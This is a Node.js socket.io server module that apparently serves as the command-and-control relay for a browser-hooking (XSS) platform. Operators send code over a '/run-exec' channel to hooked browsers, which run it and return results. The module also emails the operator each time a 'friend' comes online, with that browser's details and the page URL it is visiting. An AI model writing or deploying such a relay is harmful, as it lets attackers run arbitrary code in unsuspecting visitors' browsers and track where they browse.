const mailSender = require('../push/mail').mailSender
const cacheKey = require('../cacheKey')

function socketInit (server) {
    const io = require('socket.io')(server)

    let POOL = {
        Senders: [],
        Receiver: []
    }

    const sendCode = io.of('/run-exec').on('connection', (socket) => {
        // offline
        socket.on('disconnect', function () {
            console.log('a sender died')
            POOL.Senders.forEach((item, index) => {
                if (item.client === socket) {
                    POOL.Senders.splice(index, 1)
                    console.log('died sender removed')
                }
            })
        })

        // init sender
        socket.on('init-sender', (data) => {
            if (!data.TOKEN) return

            AV.User.become(data.TOKEN)
                .then(user => {
                    POOL.Senders.push({
                        UID: user.id,
                        client: socket
                    })
                    POOL.Receiver.forEach(item => {
                        if (item.UID === user.id) {
                            toSender(user.id, 'new-client', item.data)
                        }
                    })
                })
                .catch(err => {
                    console.log(err)
                })
        })

        // send execute code
        socket.on('run-code', (data) => {
            if (!data.CID) return
            POOL.Receiver.forEach((item, index) => {
                if (item.CID === data.CID) {
                    item.client.emit('code', data)
                }
            })
        })
    })

    

    const execCode = io.of('/exec').on('connection', (socket) => {
        // new client init 
        socket.on('init-client', data => {
            if (!data.keyId) return
           
            const keyId = data.keyId
            let clientData = {
                keyId: keyId,
                CID: socket.id,
                client: socket,
                data: data
            }

            if (LRUCache.has(cacheKey(keyId, 'alias-user')) && LRUCache.has(cacheKey(keyId, 'alias-project'))) {
                return initReceiver(socket, data, clientData, LRUCache.get(cacheKey(keyId, 'alias-project')), LRUCache.get(cacheKey(keyId, 'alias-user')))
            }

            const query = new AV.Query('Project')

            query.equalTo('alias', keyId)
            query.include('creator')
            query.limit(1)
            query.find()
                .then(projects => {
                    if (!projects.length) return
                    let project = projects[0]
                    let user = project.get('creator')
                    LRUCache.set(cacheKey(keyId, 'alias-project'), project)
                    LRUCache.set(cacheKey(keyId, 'alias-user'), project.get('creator'))
                    initReceiver(socket, data, clientData, project, user)
                })
                .catch(err => {
                    console.log(err)
                })
        })

        // client offline
        socket.on('disconnect', () => {
            POOL.Receiver.forEach((item, index) => {
                if (item.client === socket) {
                    toSender(item.keyId, 'die-client', item.CID)
                    POOL.Receiver.splice(index, 1)
                }
            })
        })

        // execute code
        socket.on('exec-code-result', data => {
            POOL.Receiver.forEach((item, index) => {
                if (item.client === socket) {
                    toSender(item.UID, 'exec-code-result', data)
                }
            })
        })
    })

    function initReceiver (socket, data, clientData, project, user) {
        data['CID'] = socket.id
        data['UID'] = user.id
        data['project'] = project.get('title')
        clientData['UID'] = user.id

        POOL.Receiver.push(clientData)
        toSender(user.id, 'new-client', data)
        mailSender(
            project.get('title') + ' 项目消息: 你的好友已上线',
            '你的好友已上线',
            '<p>你的好友已上线</p><p>TA 正在使用 ' + data.browser + ' 访问 ' + data.host + '</p><p>具体地址为：' + data.URL + '</p>',
            user.get('email')
        )
    }

    function toSender (UID, channel, data, mailNotify) {
        let sender = POOL.Senders.find(s => s.UID === UID)
        if (sender) {
            sender.client.emit(channel, data)
        } else {
            if (mailNotify) {
                console.log('failed at', channel, data)
            }
        }
        
    }
}

module.exports = socketInit